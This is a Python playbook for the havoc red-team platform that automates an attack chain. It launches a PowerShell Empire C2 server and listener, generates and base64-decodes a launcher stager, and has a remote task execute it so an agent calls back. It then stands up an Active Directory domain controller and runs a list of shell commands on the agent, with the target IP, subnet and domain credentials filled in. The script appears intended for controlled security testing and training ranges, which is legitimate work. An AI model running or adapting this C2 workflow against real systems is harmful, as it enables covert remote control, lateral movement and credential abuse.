# Import the supporting Python packages.
import re
import os
import sys
import json
import string
import random
import pprint
import time as t
import argparse
import subprocess
from configparser import ConfigParser
from datetime import datetime

# Import the havoc Python package.
import havoc

init_parser = argparse.ArgumentParser(description='havoc playbook - C2 with AD scans')

init_parser.add_argument('--profile', help='Use a specific profile from your credential file')
init_args = init_parser.parse_args()

profile = init_args.profile

# Load the configuration file
config = ConfigParser()
config_file = os.path.expanduser('~/.havoc/config')
config.read(config_file)

# Get api_key and secret_key
if profile:
    api_key = config.get(profile, 'API_KEY')
    secret = config.get(profile, 'SECRET')
    api_region = config.get(profile, 'API_REGION')
    api_domain_name = config.get(profile, 'API_DOMAIN_NAME')
else:
    api_key = config.get('default', 'API_KEY')
    secret = config.get('default', 'SECRET')
    api_region = config.get('default', 'API_REGION')
    api_domain_name = config.get('default', 'API_DOMAIN_NAME')

h = havoc.Connect(api_region, api_domain_name, api_key, secret)

# Create a date string to use in the task name.
d = datetime.utcnow()
sdate = d.strftime('%m-%d-%Y-%H-%M')

# Configure pretty print for displaying output.
pp = pprint.PrettyPrinter(indent=4)

# Create a config parser and setup config parameters
config = ConfigParser()
config.read('havoc-playbooks/c2_with_ad_dc/c2_with_ad_dc.ini')

listener_type = config.get('c2_task', 'listener_type')
listener_profile = config.get('c2_task', 'listener_profile')
listener_port = config.get('c2_task', 'listener_port')
listener_tls = config.get('c2_task', 'listener_tls')
domain_name = config.get('c2_task', 'domain_name')
cert_subj = config.get('c2_task', 'cert_subj')
remote_ad_task_name = config.get('remote_ad_task', 'task_name')
ad_tld = config.get('remote_ad_task', 'ad_tld')
ad_domain = config.get('remote_ad_task', 'ad_domain')
ad_realm = config.get('remote_ad_task', 'ad_realm')
user_name = config.get('remote_ad_task', 'user_name')
user_password = config.get('remote_ad_task', 'user_password')
admin_password = config.get('remote_ad_task', 'admin_password')
remote_c2_agent_task_name = config.get('remote_c2_agent_task', 'task_name')
target_cidr = config.get('remote_c2_agent_task', 'cidr')
command_list = config.get('remote_c2_agent_task', 'command_list')

if listener_profile != 'None':
    resource_name = listener_profile
else:
    resource_name = listener_type

# These vars will be used by the clean_up function to determine what components need to be removed. Each operation that
# creates one of the below resources will set the var to the resource name to be used in the clean up operation.
ad_server_exists = False
portgroup_exists = False
stager_exists = False
task_exists = False
agent_exists = False
clean_up_initiated = False


def get_task_attack_ip(tn):
    task_details = h.get_task(tn)
    task_attack_ip = task_details['attack_ip']
    return task_attack_ip


def get_task_target_ip(tn):
    task_details = h.get_task(tn)
    task_target_ip_list = task_details['local_ip']
    task_target_ip = None
    for ip in task_target_ip_list:
        if '172.17.' not in ip:
            task_target_ip = ip
    return task_target_ip


# Poll the task_details until the task's status 'idle'.
def get_task_status(tn):
    task_status = None
    task_details = None
    while task_status != 'idle':
        t.sleep(5)
        task_details = h.get_task(tn)
        task_status = task_details['task_status']
    print(f'\n{tn} is ready:')
    pp.pprint(task_details)
    return task_details


# A 'while loop' can be used to continually pull the results queue until the command results are returned.
def get_command_results(tn, ic, ii, print_output=True):
    results = []
    command_finished = None
    try:
        while not command_finished:
            command_results = h.get_task_results(tn)
            for entry in command_results['queue']:
                if entry['instruct_command'] == ic and entry['instruct_instance'] == ii:
                    command_finished = True
                    if print_output:
                        print(f'\n{tn} {ic} results:')
                        pp.pprint(entry)
                    results.append(entry)
            if not command_finished:
                t.sleep(5)
    except KeyboardInterrupt:
        print('get_command_results interrupted. Initiating clean_up.')
        clean_up()
    return results


def clean_up():
    if ad_server_exists:
        print(f'Killing AD DC on {ad_server_exists[0]}')
        instruct_instance = ad_server_exists[1]
        instruct_command = 'kill_ad_dc'
        h.instruct_task(ad_server_exists[0], instruct_instance, instruct_command)

    if agent_exists:
        # Kill the agent.
        print(f'\nKilling agent with name {agent_exists[0]}.')
        instruct_instance = agent_exists[1]
        instruct_command = 'kill_process'
        h.instruct_task(agent_exists[2], instruct_instance, instruct_command)
        # Wait for the agent to shut down.
        t.sleep(5)

    if task_exists:
        # Kill the task.
        print(f'\nKilling task with name {task_exists}.')
        instruct_instance = 'clean_up'
        instruct_command = 'terminate'
        h.instruct_task(task_exists, instruct_instance, instruct_command)
        command_finished = None
        while not command_finished:
            kill_task_results = h.get_task_results(task_exists)
            for entry in kill_task_results['queue']:
                if entry['instruct_command'] == instruct_command and entry['instruct_instance'] == instruct_instance:
                    print('Task terminated.')
                    command_finished = True
            if not command_finished:
                t.sleep(5)

    if stager_exists:
        # Delete the stager file from the workspace.
        print(f'\nDeleting the stager file {stager_exists} from the shared workspace.')
        h.delete_file(stager_exists)

    if portgroup_exists:
        # Delete the portgroup.
        print(f'\nDeleting the {portgroup_exists} portgroup.')
        h.delete_portgroup(portgroup_exists)

    # All done.
    sys.exit('\nDone... Exiting.\n')


# Verify remote_c2_agent_task_name exists
print(f'\nVerifying that trainman task {remote_c2_agent_task_name} exists.')
attack_ip = None
task_list = h.list_tasks()
if remote_c2_agent_task_name in task_list['tasks']:
    attack_ip = get_task_attack_ip(remote_c2_agent_task_name)
else:
    sys.exit(f'\nTrainman task {remote_c2_agent_task_name} does not exist. Exiting...')

# Verify remote_ad_task_name exists
print(f'\nVerifying that trainman task {remote_ad_task_name} exists.')
target_ip = None
task_list = h.list_tasks()
if remote_ad_task_name in task_list['tasks']:
    target_ip = get_task_target_ip(remote_ad_task_name)
else:
    sys.exit(f'\nTrainman task {remote_ad_task_name} does not exist. Exiting...')

# Create a portgroup for the powershell_empire task's listener.
print(f'\nCreating a portgroup for {resource_name} listener.')
h.create_portgroup(resource_name, f'Allows port {listener_port} traffic')
print(f'\nAdding portgroup rule to allow {remote_c2_agent_task_name} task attack IP {attack_ip} to reach '
      f'{resource_name} listener on port {listener_port}.\n')
h.update_portgroup_rule(resource_name, 'add', f'{attack_ip}/32', listener_port, 'tcp')
portgroup_exists = resource_name

# Launch a powershell_empire task for the listener.
task_name = f'{resource_name}_{sdate}'
portgroups = [resource_name]
if domain_name == 'None':
    task_host_name = 'None'
else:
    task_host_name = resource_name
print(f'\nLaunching powershell_empire task with name {task_name}.')
h.run_task(
    task_name, 'powershell_empire', task_host_name=task_host_name, task_domain_name=domain_name, portgroups=portgroups
)
task_exists = task_name

# Wait for the powershell_empire task to become ready.
print(f'\nWaiting for powershell_empire task {task_name} to become ready.')
pse_task_status = get_task_status(task_name)
pse_ip = pse_task_status['attack_ip']
print(f'\nThe powershell_empire task is ready with the following parameters:')
print(f'\nIP - {pse_ip}')
print(f'\nHost name - {task_host_name}')
print(f'\nDomain name - {domain_name}')

# Use a random string for the PowerShell Empire instruct_instance.
pse_instruct_instance = ''.join(random.choice(string.ascii_letters) for i in range(6))

# If TLS listener requested, generate a certificate.
if listener_tls == 'yes':
    subj = None
    if domain_name != 'None':
        subj = re.sub('\$HOST', f'{resource_name}.{domain_name}', cert_subj)
    if domain_name == 'None':
        subj = re.sub('\$HOST', f'{pse_ip}', cert_subj)
    instruct_command = 'cert_gen'
    instruct_args = {'subj': subj}
    h.instruct_task(task_name, pse_instruct_instance, instruct_command, instruct_args)

    # Get the cert_gen command results
    cert_gen_results = get_command_results(task_name, instruct_command, pse_instruct_instance)
    for cg_result in cert_gen_results:
        if cg_result['instruct_command'] == instruct_command and cg_result['instruct_instance'] == pse_instruct_instance:
            instruct_command_output = json.loads(cg_result['instruct_command_output'])
            if instruct_command_output['outcome'] == 'success':
                print('\ncert_gen succeeded.\n')
            else:
                print('\ncert_gen failed... Exiting.\n')
                clean_up()

# Create a listener for the powershell_empire task.
print(f'\nCreating {resource_name} listener on {task_name} task.')
if listener_tls == 'yes':
    listener_protocol = 'https'
else:
    listener_protocol = 'http'
if domain_name != 'None':
    listener_host = f'{listener_protocol}://{resource_name}.{domain_name}:{listener_port}'
else:
    listener_host = f'{listener_protocol}://{pse_ip}:{listener_port}'
instruct_command = 'create_listener'
instruct_args = {
        'listener_type': listener_type,
        'Name': f'{resource_name}',
        'Host': listener_host,
        'Port': listener_port
    }
if listener_type == 'http_malleable' and listener_profile != 'None':
    instruct_args['Profile'] = f'{listener_profile}.profile'
if listener_tls == 'yes':
    instruct_args['CertPath'] = '/opt/Empire/empire/server/data/'
h.instruct_task(task_name, pse_instruct_instance, instruct_command, instruct_args)

# Get the create_listener command results.
create_listener_results = get_command_results(task_name, instruct_command, pse_instruct_instance)
for cl_result in create_listener_results:
    if cl_result['instruct_command'] == instruct_command and cl_result['instruct_instance'] == pse_instruct_instance:
        instruct_command_output = json.loads(cl_result['instruct_command_output'])
        if instruct_command_output['outcome'] == 'success':
            print('\ncreate_listener succeeded.\n')
        else:
            print('\ncreate_listener failed... Exiting.\n')
            clean_up()

# Generate a stager for the listener.
print(f'\nGenerating a stager for the {resource_name} listener.')
instruct_command = 'create_stager'
instruct_args = {
    'Listener': f'{resource_name}',
    'StagerName': 'multi/launcher',
    'Language': 'python',
    'OutFile': f'{resource_name}.sh'
}
h.instruct_task(task_name, pse_instruct_instance, instruct_command, instruct_args)

# Get the create_stager command results.
stager = get_command_results(task_name, instruct_command, pse_instruct_instance)
for s in stager:
    if s['instruct_command'] == instruct_command and s['instruct_instance'] == pse_instruct_instance:
        instruct_command_output = json.loads(s['instruct_command_output'])
        if instruct_command_output['outcome'] == 'success':
            print('\ncreate_stager succeeded.\n')
        else:
            print('\ncreate_stager failed... Exiting.\n')
            clean_up()
output = json.loads(stager[0]['instruct_command_output'])['stager']['multi/launcher']['Output']
subprocess.call(f'echo {output} | base64 -d > {resource_name}.sh', shell=True)

# Upload the stager file to the shared workspace
print('\nUploading the stager file to the shared workspace.')
f = open(f'{resource_name}.sh', 'rb')
raw_file = f.read()
h.create_file(f'{resource_name}.sh', raw_file)
stager_exists = f'{resource_name}.sh'

# Use a random string for the remote_c2_agent_task instruct_instance.
c2_instruct_instance = ''.join(random.choice(string.ascii_letters) for i in range(6))

# Make sure there isn't an existing stager file with the same name on the trainman task.
print(f'\nDeleting any existing {resource_name}.sh stager from remote trainman task {remote_c2_agent_task_name}.')
instruct_command = 'del'
instruct_args = {'file_name': f'{resource_name}.sh'}
h.instruct_task(remote_c2_agent_task_name, c2_instruct_instance, instruct_command, instruct_args)

# Get the del command results.
del_results = get_command_results(remote_c2_agent_task_name, instruct_command, c2_instruct_instance)
for del_result in del_results:
    if del_result['instruct_command'] == instruct_command and del_result['instruct_instance'] == c2_instruct_instance:
        instruct_command_output = json.loads(del_result['instruct_command_output'])
        if instruct_command_output['outcome'] == 'success':
            print('\nFile delete request succeeded.\n')
        else:
            print('\nNo existing file was present. Proceeding...\n')

# Ask the trainman task to sync it's local workspace from the shared workspace.
print(f'\nDownloading stager file from shared workspace to {remote_c2_agent_task_name} task local workspace.')
instruct_command = 'sync_from_workspace'
h.instruct_task(remote_c2_agent_task_name, c2_instruct_instance, instruct_command)

# Get the sync_workspace command results.
sync_workspace_results = get_command_results(remote_c2_agent_task_name, instruct_command, c2_instruct_instance)
for sw_result in sync_workspace_results:
    if sw_result['instruct_command'] == instruct_command and sw_result['instruct_instance'] == c2_instruct_instance:
        instruct_command_output = json.loads(sw_result['instruct_command_output'])
        if instruct_command_output['outcome'] == 'success':
            print('\nsync_from_workspace succeeded.\n')
        else:
            print('\nsync_from_workspace failed... Exiting.\n')
            clean_up()

# Ask the trainman task to execute the stager file.
print(f'\nInstructing remote trainman task {remote_c2_agent_task_name} to execute stager {resource_name}.sh.')
instruct_command = 'execute_process'
instruct_args = {'file_path': f'/opt/havoc/shared/{resource_name}.sh'}
h.instruct_task(remote_c2_agent_task_name, c2_instruct_instance, instruct_command, instruct_args)

# Get the execute_process command results.
execute_process_results = get_command_results(remote_c2_agent_task_name, instruct_command, c2_instruct_instance)
for ep_result in execute_process_results:
    if ep_result['instruct_command'] == instruct_command and ep_result['instruct_instance'] == c2_instruct_instance:
        instruct_command_output = json.loads(ep_result['instruct_command_output'])
        if instruct_command_output['outcome'] == 'success':
            print('\nexecute_process request succeeded.\n')
        else:
            print('\nexecute_process request failed... Exiting.\n')
            clean_up()

# Use a random string for the agent instruct_instance.
agent_instruct_instance = ''.join(random.choice(string.ascii_letters) for i in range(6))

print(f'\nWaiting for an agent connection on task {task_name}.\n')
agents = get_command_results(task_name, 'agent_status_monitor', 'agent_status_monitor')
agent_name = json.loads(agents[0]['instruct_command_output'])['agent_info']['name']
agent_exists = [agent_name, agent_instruct_instance, remote_c2_agent_task_name]

# Start an AD DC on the remote_ad_task
# Use a random string for the remote_ad_task instruct_instance.
ad_instruct_instance = ''.join(random.choice(string.ascii_letters) for i in range(6))

# Ask the remote_ad_task to start an AD DC.
print(f'\nInstructing {remote_ad_task_name} to start an Active Directory DC.')
instruct_command = 'run_ad_dc'
instruct_args = {
    'domain': ad_domain,
    'realm': ad_realm,
    'user_name': user_name,
    'user_password': user_password,
    'admin_password': admin_password
}
h.instruct_task(remote_ad_task_name, ad_instruct_instance, instruct_command, instruct_args)

# Get the run_ad_dc command results.
run_ad_dc_results = get_command_results(remote_ad_task_name, instruct_command, ad_instruct_instance)
for dc_result in run_ad_dc_results:
    if dc_result['instruct_command'] == instruct_command and dc_result['instruct_instance'] == ad_instruct_instance:
        instruct_command_output = json.loads(dc_result['instruct_command_output'])
        if instruct_command_output['outcome'] == 'success':
            print('\nrun_ad_dc succeeded.\n')
            ad_server_exists = [remote_ad_task_name, ad_instruct_instance]
        else:
            print('\nrun_ad_dc failed.\n')
            clean_up()

# Execute a list of shell commands on the agent.
results_count = 0
for command in command_list.split(', '):
    if command == 'pause':
        # Wait for key press and then go to the next command
        input('Paused. Press Enter to continue...')
        command = 'whoami'
    # Replace variables in shell_command
    target_insert = re.sub('\$TARGET', target_ip, command)
    cidr_insert = re.sub('\$CIDR', target_cidr, target_insert)
    tld_insert = re.sub('\$AD_TLD', ad_tld, cidr_insert)
    domain_insert = re.sub('\$AD_DOMAIN', ad_domain, tld_insert)
    user_name_insert = re.sub('\$USER_NAME', user_name, domain_insert)
    user_password_insert = re.sub('\$USER_PASSWORD', user_password, user_name_insert)
    shell_command = re.sub('\$ADMIN_PASSWORD', admin_password, user_password_insert)
    print(f'\nTasking agent with agent_shell_command "{shell_command}"\n')
    # Use a random string for the agent instruct_instance of each shell command.
    sc_instruct_instance = ''.join(random.choice(string.ascii_letters) for i in range(6))
    instruct_command = 'agent_shell_command'
    instruct_args = {'Name': agent_name, 'command': shell_command}
    h.instruct_task(task_name, sc_instruct_instance, instruct_command, instruct_args)

    # Get the agent_shell_command confirmation.
    print(f'\nWaiting for confirmation of agent_shell_command "{shell_command}".\n')
    shell_command_confirmation = get_command_results(task_name, instruct_command, sc_instruct_instance)
    for sc_conf in shell_command_confirmation:
        if sc_conf['instruct_command'] == instruct_command and sc_conf['instruct_instance'] == sc_instruct_instance:
            instruct_command_output = json.loads(sc_conf['instruct_command_output'])
            if instruct_command_output['outcome'] == 'success':
                print(f'{shell_command} succeeded.\n')
            else:
                print(f'{shell_command} failed.\n')
                clean_up()

    # Get the agent_shell_command results.
    print(f'\nGetting results from agent_shell_command "{shell_command}"\n')
    results = None
    while not results:
        try:
            instruct_command = 'get_shell_command_results'
            instruct_args = {'Name': agent_name}
            h.instruct_task(task_name, sc_instruct_instance, instruct_command, instruct_args)

            # Get the output from the get_shell_command_results command.
            shell_command_results = get_command_results(task_name, instruct_command, sc_instruct_instance, False)
            for sc_result in shell_command_results:
                if sc_result['instruct_command'] == instruct_command and \
                        sc_result['instruct_instance'] == sc_instruct_instance:
                    instruct_command_output = json.loads(sc_result['instruct_command_output'])
                    if instruct_command_output['outcome'] == 'success':
                        results = instruct_command_output['results'][results_count]['results']
                    else:
                        results = f'{shell_command} failed.\n'
            if not results:
                t.sleep(10)
        except KeyboardInterrupt:
            if not clean_up_initiated:
                print('get_command_results interrupted. Initiating clean_up.')
                clean_up_initiated = True
                clean_up()
    print(f'\n{shell_command} results:\n')
    print(results)
    results_count += 1

    # Wait for the powershell_empire task to become idle.
    print(f'\nWaiting for powershell_empire task {task_name} to become idle.')
    pse_task_status = get_task_status(task_name)
    print(f'\n{task_name} is now idle.')
    t.sleep(random.randrange(20))

# Playbook is complete; time to clean up.
print('\nPlaybook operation completed. Cleaning up ./havoc resources.')
clean_up()
